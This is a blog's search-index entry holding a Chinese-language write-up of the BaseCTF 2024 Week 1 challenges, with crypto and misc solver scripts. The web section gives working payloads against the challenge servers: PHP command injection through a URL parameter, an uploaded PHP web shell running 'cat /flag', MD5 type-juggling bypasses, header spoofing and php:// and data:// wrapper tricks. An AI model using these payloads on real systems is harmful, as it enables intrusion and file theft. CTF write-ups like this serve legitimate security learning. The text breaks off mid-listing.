<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BaseCTF 2024 Week1 Writeup</title>
    <link href="/2024/08/21/ctf/basectf2024/week1/"/>
    <url>/2024/08/21/ctf/basectf2024/week1/</url>
    
    <content type="html"><![CDATA[<p>BaseCTF 2024 第一周赛题的 WP，热身赛捏。</p><span id="more"></span><p>在小羽网安的公众号看到的，本来毕设已经很焦虑了，但是就是主打一个主次不分。</p><h2 id="misc">Misc</h2><h3 id="根本进不去啊">根本进不去啊!</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dig -t TXT flag.basectf.fun<br></code></pre></td></tr></table></figure><h3 id="海上遇到了鲨鱼">海上遇到了鲨鱼</h3><img src="/2024/08/21/ctf/basectf2024/week1/misc_wireshark.png" class="" title="Wireshark 分析包"><p>复制文本然后执行以下 Python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;flag&gt;&quot;</span>[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h3 id="正着看还是反着看呢">正着看还是反着看呢？</h3><img src="/2024/08/21/ctf/basectf2024/week1/misc_flagorgalf.png" class="" title="hex 分析"><p>看到最后是一个 JFIF 的倒着写，执行下面的 Python 脚本将文件倒过来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f, <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;galf.jpg&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> d:<br>    data = f.read()<br>    d.write(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(data))))<br></code></pre></td></tr></table></figure><p><code>binwalk</code> 查一下文件，发现 <code>flag.txt</code>和一个压缩包，以为是个假的，压缩包解压出来也是，那就交了吧。</p><h3 id="base">Base</h3><p>后面6个等于号，大概是 Base 编码系列但是不是Base64。分析一下编码结果，发现只有大写字母和一些数字，那么大概率是Base32 了，解一下发现好像是 Base64，再解一下就<ahref="https://gchq.github.io/CyberChef/#recipe=From_Base32(&#39;A-Z2-7%3D&#39;,true)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)&amp;input=S0ZXVU02UzJLVkhGS1VUT09RWlZVVkNHTkpHVU9NTE1MQVpWRTVTWUdKRVRBWVpTS1pWR0lSMjJIRT09PT09PQ">flag</a>了。</p><h3 id="人生苦短我用python">人生苦短，我用Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> accumulate, product<br><br>n = <span class="hljs-number">38</span><br>ind = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(n))<br>flag = [<span class="hljs-string">&#x27; &#x27;</span>]*n<br><br><span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&quot;BaseCTF&#123;&quot;</span>):<br>    flag[i] = c<br><br>flag[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;Mp&quot;</span>)<br><br>flag[-<span class="hljs-number">3</span>:] = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;3x&#125;&quot;</span>)<br><br>flag[-<span class="hljs-number">1</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">125</span>)<br><br><span class="hljs-keyword">for</span> i, ind <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(accumulate([<span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>][:-<span class="hljs-number">1</span>])):<br>    flag[i+ind] = <span class="hljs-string">&#x27;_&#x27;</span><br><span class="hljs-comment"># assert list(map(len, &quot;&quot;.join(flag).split(&#x27;_&#x27;))) == [14, 2, 6, 4, 8], str(list(map(len, &quot;&quot;.join(flag).split(&#x27;_&#x27;))))</span><br><br>flag[<span class="hljs-number">12</span>:<span class="hljs-number">32</span>:<span class="hljs-number">4</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;lsT_n&quot;</span>)<br><br><span class="hljs-comment"># flag[8] = &#x27;S&#x27;</span><br>flag[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;s&#x27;</span><br><br>flag[-<span class="hljs-number">11</span>] = <span class="hljs-string">&#x27;4&#x27;</span><br><br>flag[-<span class="hljs-number">7</span>:-<span class="hljs-number">3</span>] = <span class="hljs-built_in">list</span>(base64.b64decode(<span class="hljs-string">&#x27;MG1QbA==&#x27;</span>).decode())<br><br>flag[::-<span class="hljs-number">7</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;7d4372733173&quot;</span>).decode())<br><br><span class="hljs-comment"># set(flag[12::11]) == &#123;&#x27;l&#x27;, &#x27;r&#x27;&#125;</span><br><br>flag[<span class="hljs-number">21</span>:<span class="hljs-number">27</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">116</span>, <span class="hljs-number">51</span>, <span class="hljs-number">114</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">104</span>]).decode())<br><br><span class="hljs-keyword">for</span> _c <span class="hljs-keyword">in</span> product(string.printable, repeat=<span class="hljs-number">2</span>):<br>    _s = [flag[<span class="hljs-number">17</span>], *_c]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(_s)) == <span class="hljs-number">41378751114180610</span>:<br>        flag[<span class="hljs-number">17</span>:<span class="hljs-number">20</span>] = _s<br>        <span class="hljs-keyword">break</span><br><br>flag[<span class="hljs-number">13</span>] = <span class="hljs-string">&#x27;3&#x27;</span><br>flag[<span class="hljs-number">15</span>] = <span class="hljs-string">&#x27;1&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br></code></pre></td></tr></table></figure><h2 id="crypto">Crypto</h2><h3 id="ez_math">ez_math</h3><p>看来不是标准解，两个三角矩阵6个未知量加上 <spanclass="math inline">\(a, b, c, d\)</span> 与 <code>flag</code>5个共11个未知量，矩阵是9个等式，2个乘积2个等式，可以解出<code>flag</code>。用 sagemath 解。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs sagemath">R = matrix([[<br>    73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245,<br>    46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830,<br>    161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185,<br>], [<br>    13874395612510317401724273626815493897470313869776776437748145979913315379889260408106588331541371806148807844847909,<br>    17025249852164087827929313934411832021160463738288565876371918871371314930048841650464137478757581505369909723030523,<br>    59510107422473463833740668736202898422777415868238817665123293560097821015330,<br>], [<br>    11314088133820151155755028207579196628679021106024798818326096960197933616112389017957501267749946871903275867785729,<br>    13883500421020573457778249958402264688539607625195400103961001780695107955462968883861677871644577542226749179056659,<br>    48528427402189936709203219516777784993195743269405968907408051071264464132448,<br>]])<br><br>f, x1, y1, z1, x2, y2, z2 = var(&quot;f, x1, y1, z1, x2, y2, z2&quot;)<br><br>u = matrix([[1,x1,y1], [0,1,z1], [0,0,1]])<br>l = matrix([[1,0,0], [x2,1,0], [y2,z2,1]])<br>B = u*l<br><br>t1 = [292585039548930662326103829416538145189, 293124197879399252223245955841307374193, ]<br>t2 = [239032610975319686124167120759414114611, 294816936919419198311047310603595242713, ]<br>for a, d in [t1, reversed(t1)]:<br>    for b, c in [t2, reversed(t2)]:<br>        A = matrix([[f,0,0], [0,a,b], [0,c,d]])<br>        L = A*B<br>        eqs = []<br>        for i in range(3):<br>            for j in range(3):<br>                eqs.append(L[i][j] == R[i][j])<br>        ans = solve(eqs, f, x1, y1, z1, x2, y2, z2)<br>        if ans:<br>            print(ans)<br></code></pre></td></tr></table></figure><h3 id="babypack">babypack</h3><p><code>output.txt</code> 太大了，直接改名为<code>output.py</code>，原理尚不清楚，但是大概是因为每个比特的数字都大于低位比特数字之和，所以应该是不存在选择当前位与选择一些低位之和冲突。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> output <span class="hljs-keyword">import</span> *<br><br>bits = []<br>cc = c<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> cc &gt;= b:<br>        bits.append(<span class="hljs-number">1</span>)<br>        cc -= b<br>    <span class="hljs-keyword">else</span>:<br>        bits.append(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, bits)), base=<span class="hljs-number">2</span>)).decode())<br></code></pre></td></tr></table></figure><h3 id="babyrsa">babyrsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><br>d = gmpy2.invert(e, n-<span class="hljs-number">1</span>)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m).decode())<br></code></pre></td></tr></table></figure><h3 id="十七倍">十七倍</h3><p>17 = 0b10001，高4位减去低4位得到原始的高4位，注意也许要退位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher = [<br>    <span class="hljs-number">98</span>,  <span class="hljs-number">113</span>, <span class="hljs-number">163</span>, <span class="hljs-number">181</span>, <span class="hljs-number">115</span>, <span class="hljs-number">148</span>, <span class="hljs-number">166</span>,  <span class="hljs-number">43</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">95</span>,<br>    <span class="hljs-number">165</span>, <span class="hljs-number">146</span>,  <span class="hljs-number">79</span>, <span class="hljs-number">115</span>, <span class="hljs-number">146</span>, <span class="hljs-number">233</span>, <span class="hljs-number">112</span>, <span class="hljs-number">180</span>,  <span class="hljs-number">48</span>,  <span class="hljs-number">79</span>,<br>    <span class="hljs-number">65</span>,  <span class="hljs-number">181</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>,  <span class="hljs-number">46</span>, <span class="hljs-number">249</span>,  <span class="hljs-number">78</span>, <span class="hljs-number">183</span>,  <span class="hljs-number">79</span>, <span class="hljs-number">133</span>,<br>    <span class="hljs-number">180</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">148</span>, <span class="hljs-number">163</span>,  <span class="hljs-number">79</span>,  <span class="hljs-number">78</span>,  <span class="hljs-number">48</span>, <span class="hljs-number">231</span>,  <span class="hljs-number">77</span>,<br>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> c: <span class="hljs-built_in">chr</span>(((c+<span class="hljs-number">0x100</span>)-((c&amp;<span class="hljs-number">0xf</span>)&lt;&lt;<span class="hljs-number">4</span>))&amp;<span class="hljs-number">0x7f</span>), cipher)))<br></code></pre></td></tr></table></figure><h3 id="hellocrypto">helloCrypto</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>key1 = <span class="hljs-number">208797759953288399620324890930572736628</span><br>key = long_to_bytes(key1)<br><br>c = <span class="hljs-string">b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br>my_ass = AES.new(key=key, mode=AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(unpad(my_ass.decrypt(c), AES.block_size).decode())<br></code></pre></td></tr></table></figure><h3 id="ez_rsa">ez_rsa</h3><p><span class="math inline">\(\varphi(n) = (p-1)(q-1) = n - (p+q) +1\)</span>，<span class="math inline">\(\varphi&#39; = (p+2)(q+2) =n+2(p+q) + 4\)</span>，用 <spanclass="math inline">\(\varphi&#39;\)</span> 求出 <spanclass="math inline">\(p+q\)</span> 即可求出 <spanclass="math inline">\(\varphi(n)\)</span>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br>not_phi = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br>c = <span class="hljs-number">37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br>e = <span class="hljs-number">65537</span><br><br>p_q_add = (not_phi-n-<span class="hljs-number">4</span>)//<span class="hljs-number">2</span><br>phi = not_phi - <span class="hljs-number">3</span>*p_q_add - <span class="hljs-number">3</span><br>d = gmpy2.invert(e, phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n)).decode())<br></code></pre></td></tr></table></figure><h3 id="你会算md5吗">你会算md5吗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>MAPPER = &#123;md5(c.encode()).hexdigest(): c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> printable&#125;<br>output = [<br>    <span class="hljs-string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <br>    <span class="hljs-string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="hljs-string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>, <br>    <span class="hljs-string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="hljs-string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>, <br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <br>    <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>, <br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <br>    <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>, <br>    <span class="hljs-string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <br>    <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span><br>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> _md5: MAPPER[_md5], output)))<br></code></pre></td></tr></table></figure><h2 id="pwn">Pwn</h2><p>最差的一部分，得好好补补了。这部分只做了两题，会用 nc 会用基础的linux 命令即可，就不放在这里丢人现眼了。</p><h2 id="web">Web</h2><h3 id="http-是什么呀">HTTP 是什么呀</h3><p>正好练习一下 curl，最后所有都对了就是没输出，所以用<code>--verbose</code> 参数看一下到底发生了什么。发现是重定向了，而且flag 在 url 里面。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://challenge.basectf.fun:37388?basectf=we1c%2500me&quot; \<br>    --data Base=fl@g \<br>    --cookie c00k13=&quot;i can&#x27;t eat it&quot; \<br>    --header &quot;User-Agent:Base&quot; \<br>    --header &quot;Referer:Base&quot; \<br>    --header &quot;X-Forwarded-For:127.0.0.1&quot; \<br>    --verbose<br></code></pre></td></tr></table></figure><h3 id="喵喵喵ﻌ">喵喵喵´•ﻌ•`</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://challenge.basectf.fun:22840/?DT=system(%22cat%20/flag%22);&quot;<br></code></pre></td></tr></table></figure><h3 id="md5绕过欸">md5绕过欸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://challenge.basectf.fun:35748?name=240610708&amp;name2[]=1&quot; \<br>    --data &quot;password=314282422&amp;password2[]=2&quot;<br></code></pre></td></tr></table></figure><h3 id="a-dark-room">A Dark Room</h3><p>F12</p><h3 id="upload">upload</h3><p>写如下的脚本并上传，然后访问<code>http://host:port/uploads/filename.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>很好奇为什么不能使用 <code>$_GET</code> 参数来执行<code>system</code> 命令</p></blockquote><h3 id="aura-酱的礼物">Aura 酱的礼物</h3><blockquote><p>感谢 <a href="https://vercel.com">Vercel</a> 的大力支持</p></blockquote><p>花了好久，最后歪门邪道搞出来了。</p><p>首先是读 <code>$_POST['pen']</code> 的文件，那么直接伪协议<code>data://text/plain;base64,QXVyYQ==</code> 绕过。</p><p>接着是要求 <code>$_POST['challenge']</code> 以<code>http://jasmineaura.github.io</code>开头，并且从该变量获得的内容中包含指定内容，做题的时候大概有以下2点思路：</p><ol type="1"><li>看看这个网站上有什么可以内容注入的点，比如说一般的博客在内容搜索的时候，加入内容不存在，会说“未找到xxx”，那不就包含了。（不知道静态网页能不能做，反正是审计的内容）</li><li>找 <code>strpos</code> 和 <code>get_file_contents</code>函数的漏洞绕过。</li></ol><p>发现没什么用，有 <code>search.js</code>文件但是没用，<code>strpos</code> 和 <code>get_file_contents</code>也是弱类型绕过，这里好像没用。</p><p>忽然灵光一闪，我可以用<code>http://jasmineaura.github.io.bcb.pub</code>解析到一个服务器上，返回指定内容就好啦。因为没有备案的服务器，所以 A解析在国内没用。正好前面搞了 CNAME解析，看看能不能搞一个服务器，或者只要静态网页托管就行了。</p><p>服务器这方面，Vultr 至少需要充 10 USD；Google Cloud没有信用卡不然可以白嫖。静态托管这方面，Github Page的话不想搞乱博客（其实在 Github 上也看到了一些为了解这题创建的项目，试图CNAME 蹭蹭但是失败），GitLab/Gitee 也都有部署/审核的麻烦。最后选择了Vercel 的服务，可以支持 CNAME。设置一下绕过判断。</p><img src="/2024/08/21/ctf/basectf2024/week1/web_cname.png" class="" title="CNAME 解析"><p>最后就是一个<code>php://filter/read=convert.base64-encode/resource=flag.php</code>带出信息。</p><h2 id="reverse">Reverse</h2><blockquote><p>感谢 <a href="https://www.52pojie.cn/">52pojie</a> 的资源</p></blockquote><h3 id="you-are-good-at-ida">You are good at IDA</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> var9[<span class="hljs-number">17</span>]; <span class="hljs-comment">// [rsp+27h] [rbp-9h] BYREF</span><br><br>  _main(argc, argv, envp);<br>  <span class="hljs-built_in">strcpy</span>(var9, <span class="hljs-string">&quot;Y0u_4Re_&quot;</span>);<br>  <span 